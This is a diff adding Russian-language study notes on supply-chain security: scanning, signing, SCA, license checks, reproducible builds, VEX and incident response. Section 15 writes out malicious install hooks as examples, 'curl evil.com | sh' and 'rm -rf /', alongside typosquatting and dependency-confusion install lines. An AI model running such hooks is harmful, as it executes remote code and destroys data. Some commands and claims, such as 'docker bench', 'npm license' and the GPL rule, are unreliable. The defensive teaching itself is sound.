@@ -306,3 +306,306 @@ updates:
 - Provenance для всех container images.
 - Verify provenance в кластере (admission — проверка при деплое).
 - GitHub Actions: built-in SLSA support (встроенная поддержка SLSA).
+
+### 8. Dependency analysis: как найти транзитивные зависимости и их уязвимости
+**Проблема:** прямые зависимости безопасны, но транзитивные — с CVE.
+
+**Инструменты:**
+```bash
+# Maven: dependency tree
+mvn dependency:tree
+
+# Gradle: dependencies
+./gradlew dependencies
+
+# OWASP Dependency-Check (сканер):
+mvn org.owasp:dependency-check-maven:check
+```
+
+**Вывод:** транзитивные зависимости часто содержат CVE. Сканируй ВСЕ зависимости (не только прямые).
+
+### 9. Container image scanning: Trivy, Docker Bench, Grype
+**Container image scanning** = проверка образа на уязвимости (CVE в OS packages, app dependencies).
+
+```bash
+# Trivy:
+trivy image myapp:1.0
+
+# Grype (Anchore):
+grype myapp:1.0
+
+# Docker Bench (безопасность Docker daemon):
+docker bench
+```
+
+**Что сканируется:**
+- OS packages (apt, yum, apk)
+- App dependencies (npm, pip, maven, gradle)
+- Misconfiguration (wrong ports, sensitive dirs)
+- Secrets (API keys, passwords in image layers)
+
+**CI/CD:**
+```yaml
+# GitHub Actions:
+- name: Scan container image
+  run: trivy image --severity HIGH,CRITICAL --exit-code 1 myapp:1.0
+```
+
+### 10. Secret scanning в CI/CD: TruffleHog, gitleaks, GitHub Secret Scanning
+**Проблема:** secrets (API keys, passwords) коммитятся в репозиторий.
+
+```bash
+# TruffleHog:
+trufflehog git file://. --since-commit HEAD~10
+
+# gitleaks:
+gitleaks detect --source .
+
+# GitHub Secret Scanning (встроен):
+# Автоматически сканирует на push
+```
+
+**Правила:**
+- **Никогда** не коммитить secrets
+- **Использовать** secrets manager (AWS Secrets Manager, Vault)
+- **Ротация** secrets (еженедельно)
+- **Scanning** на push (CI)
+
+### 11. Code signing: Sigstore, cosign, notary
+**Code signing** = подпись артефактов (container images, JAR, binaries) для проверки подлинности.
+
+```bash
+# Sigstore (keyless signing):
+cosign sign --keyless myapp:1.0
+
+# Verify:
+cosign verify --keyless myapp:1.0
+
+# Notary (Docker):
+notary sign myapp:1.0
+```
+
+**Ключевые фичи:**
+- **Keyless signing** (Sigstore) — не нужно управлять ключами
+- **Reproducible builds** — один исходный код = один артефакт
+- **Verification** — проверка подписи перед deploy
+
+### 12. Software composition analysis (SCA): Snyk, OWASP Dependency-Check, Dependabot
+**SCA** (Software Composition Analysis) = анализ состава ПО (зависимости, лицензии, уязвимости).
+
+```bash
+# Snyk:
+snyk test
+snyk monitor
+
+# OWASP Dependency-Check:
+mvn org.owasp:dependency-check-maven:check
+
+# Dependabot (GitHub, автоматический):
+# .github/dependabot.yml
+```
+
+**Что проверяется:**
+- CVE в зависимостях
+- Лицензии (GPL, MIT, Apache)
+- Транзитивные зависимости
+- Платформенные зависимости (OS packages)
+
+### 13. License compliance: проверка лицензий зависимостей
+**Проблема:** GPL-зависимость в коммерческом продукте = нарушение лицензии.
+
+```bash
+# License check:
+mvn license:check
+npm license
+
+# License report:
+mvn license:report
+```
+
+**Правила:**
+- **MIT, Apache 2.0** — можно использовать
+- **GPL** — нельзя использовать в коммерческом продукте (или весь продукт под GPL)
+- **LGPL** — можно использовать (с ограничениями)
+- **Custom** — проверить условия
+
+### 14. Reproducible builds: как гарантировать, что артефакт собран из исходного кода
+**Проблема:** артефакт (JAR, image) не воспроизводим (timestamp, file order).
+
+**Maven:**
+```bash
+# Reproducible build:
+mvn clean package -Dproject.build.outputTimestamp=2024-01-01T00:00:00Z
+```
+
+**Gradle:**
+```groovy
+tasks.withType(AbstractArchiveTask) {
+    preserveFileOrder = true
+}
+```
+
+**Docker:**
+```dockerfile
+# Reproducible image:
+FROM base:1.0
+COPY . /app
+RUN --mount=type=bind,source=.,target=/src /build.sh
+```
+
+**Проверка:**
+```bash
+# Build 2 раза, сравнить hash:
+sha256sum myapp-1.0.jar
+# Должны совпадать
+```
+
+### 15. Supply chain attack scenarios: typosquatting, dependency confusion, malicious packages
+**Typosquatting:**
+```
+# Злоумышленник регистрирует:
+# lodash (легитимный)
+# lodashs (typo, malicious)
+
+# Разработчик ошибается:
+npm install lodashs  # malicious package
+```
+
+**Dependency confusion:**
+```
+# Злоумышленник публикует на npm:
+# @company/private-package (private, должен быть в private registry)
+
+# Разработчик:
+npm install @company/private-package
+# npm находит public package (malicious)
+```
+
+**Malicious packages:**
+```
+# Package содержит:
+# postinstall: curl evil.com | sh
+# preinstall: rm -rf /
+```
+
+**Защита:**
+- **Private registry** (npm, maven)
+- **Dependency verification** (Gradle verification metadata)
+- **SCA** (сканирование)
+- **Code review** (проверка зависимостей)
+
+### 16. Secure build pipeline: как настроить CI/CD для безопасных сборок
+**Pipeline:**
+```yaml
+# GitHub Actions:
+name: Secure Build
+on: [push]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      
+      # 1. SCA
+      - name: SCA scan
+        run: snyk test --severity-threshold high
+      
+      # 2. Build
+      - name: Build
+        run: mvn clean package
+      
+      # 3. Container scan
+      - name: Scan container
+        run: trivy image --severity HIGH,CRITICAL myapp:1.0
+      
+      # 4. Sign
+      - name: Sign image
+        run: cosign sign --keyless myapp:1.0
+      
+      # 5. Deploy
+      - name: Deploy
+        run: kubectl set image deployment/myapp myapp=myapp:1.0
+```
+
+**Правила:**
+- **SCA** на каждом push
+- **Container scan** перед deploy
+- **Code signing** перед deploy
+- **Private registry** для артефактов
+
+### 17. VEX (Vulnerability Exploitability eXchange): формат для управления уязвимостями
+**VEX** = формат для описания уязвимостей (CVE, exploitability, mitigations).
+
+```json
+{
+  "@context": "https://openvex.dev/ns/v0.2.0",
+  "@id": "https://example.com/vex/vex-123.json",
+  "author": "Example Inc.",
+  "timestamp": "2024-01-15T10:30:00Z",
+  "vulnerabilities": [
+    {
+      "@id": "CVE-2024-1234",
+      "vulnerability": "CVE-2024-1234",
+      "status": "affected",
+      "impact_statement": "This vulnerability affects our product.",
+      "action_statement": "Upgrade to version 2.0."
+    }
+  ]
+}
+```
+
+**Статусы:**
+- **not_affected** — уязвимость не влияет
+- **affected** — уязвимость влияет
+- **fixed** — уязвимость исправлена
+- **under_investigation** — расследуется
+
+### 18. Software supply chain security: NIST SP 800-161
+**NIST SP 800-161** = стандарт для безопасности supply chain.
+
+**Ключевые принципы:**
+- **Provenance** — происхождение ПО (кто, когда, где собрал)
+- **Integrity** — целостность (подписи, hash)
+- **Vulnerability management** — управление уязвимостями
+- **Incident response** — реагирование на инциденты
+
+**Компоненты:**
+- **SBOM** (Software Bill of Materials)
+- **Code signing**
+- **SCA** (Software Composition Analysis)
+- **VEX** (Vulnerability Exploitability eXchange)
+- **Reproducible builds**
+
+### 19. Supply chain security metrics: как измерять безопасность
+**Метрики:**
+- **CVE per release** — количество CVE в релизе
+- **Time to patch** — время до патча
+- **SBOM coverage** — покрытие SBOM (сколько зависимостей описано)
+- **License compliance** — соответствие лицензиям
+- **Reproducible build rate** — доля воспроизводимых сборок
+
+**Dashboard:**
+```
+CVE per release: 5 (target: < 3)
+Time to patch: 2 days (target: < 7 days)
+SBOM coverage: 95% (target: 100%)
+License compliance: 100%
+Reproducible build rate: 80% (target: 100%)
+```
+
+### 20. Incident response: что делать, если обнаружена уязвимость в supply chain
+**Процесс:**
+1. **Detect** — обнаружение (SCA, Snyk, Dependabot)
+2. **Assess** — оценка (severity, exploitability, impact)
+3. **Mitigate** — митигация (patch, rollback, WAF)
+4. **Notify** — уведомление (stakeholders, customers)
+5. **Post-mortem** — разбор (что произошло, как предотвратить)
+
+**Пример:**
+```
+CVE-2024-1234 (HIGH) in log4j 2.14.1
+Impact: RCE (Remote Code Execution)
+Mitigation: Upgrade to log4j 2.17.1
+Notification: All stakeholders
+Post-mortem: Add log4j to SCA, enable Dependabot
+```
